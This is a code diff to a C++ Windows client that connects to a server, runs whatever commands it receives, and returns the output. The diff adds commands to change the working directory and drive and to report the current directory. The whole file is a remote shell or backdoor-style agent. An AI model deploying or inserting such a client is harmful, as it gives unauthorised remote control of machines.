@@ -17,8 +17,12 @@ using namespace std;
 string MAC;
 int id;
 
+vector<string> dir;
+
 int main(int argc, char** argv) {
 	MAC = getMAC();
+
+	parseDir(dir, getDir());
 
 	WSAData wsaData;
 	if (WSAStartup(MAKEWORD(2, 1), &wsaData)) {
@@ -55,16 +59,32 @@ int main(int argc, char** argv) {
 	
 	while (true) {
 		_recv_wait(conn, packet);
+		string response;
 
 		switch (packet.tag) {
 			case SocketTag::EXEC: {
 				cout << packet.data << endl;
-				string result = exec(packet.data.c_str());
-				_send(conn, SocketTag::EXEC, result);
+				response = exec(dir, packet.data);
 				break;
 			}
-
+			case SocketTag::SET_CMD_DIR: {
+				response = setDirCmd(dir, packet.data);
+				break;
+			}
+			case SocketTag::SET_CMD_DISK: {
+				dir = vector<string>();
+				dir.push_back(packet.data);
+				response = "DISK CHANGED TO " + packet.data;
+				break;
+			}
+			case SocketTag::GET_CMD_DIR: {
+				response = parseDir(dir);
+				_send(conn, SocketTag::GET_CMD_DIR, response.c_str());
+				continue;
+			}
 		}
+
+		_send(conn, SocketTag::EXEC, response.c_str());
 	}
 
 	closesocket(conn);
